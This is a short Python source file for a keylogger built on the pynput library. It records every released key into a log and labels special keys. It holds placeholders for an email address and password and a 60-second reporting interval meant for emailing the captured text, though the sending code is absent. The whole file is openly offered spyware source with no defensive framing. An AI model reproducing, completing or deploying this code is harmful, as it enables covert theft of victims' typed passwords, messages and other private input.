from pynput.keyboard import Key, Controller, Listener
# from threading import Timer
# from datetime import datetime


EMAIL_ADDRESS = "YOUR_EMAIL"
EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
SEND_REPORT_EVERY = 60  # as in seconds


class Keylogger:
    ks = {
        Key.space: " ",
        Key.enter: "[ENTER]\n",
        Key.tab: "[TAB]",
        Key.backspace: "[BACKSPACE]"}

    def __init__(self, email, password, time_interval):
        self.interval = time_interval
        self.log = ""
        self.email = email
        self.password = password

    def update_log(self, str):
        self.log += str

    def on_release(self, key):
        try:
            name = key.char
        except AttributeError:
            name = Keylogger.ks.get(key, str(key))
        if key == Key.esc:
            # stop listener
            return False
        self.update_log(name.replace("'", ""))

    def start(self):
        # collect events until released
        with Listener(on_release=self.on_release) as listener:
            listener.join()


def main():
    kl = Keylogger(EMAIL_ADDRESS, EMAIL_PASSWORD, SEND_REPORT_EVERY)
    kl.start()


if __name__ == "__main__":
    main()
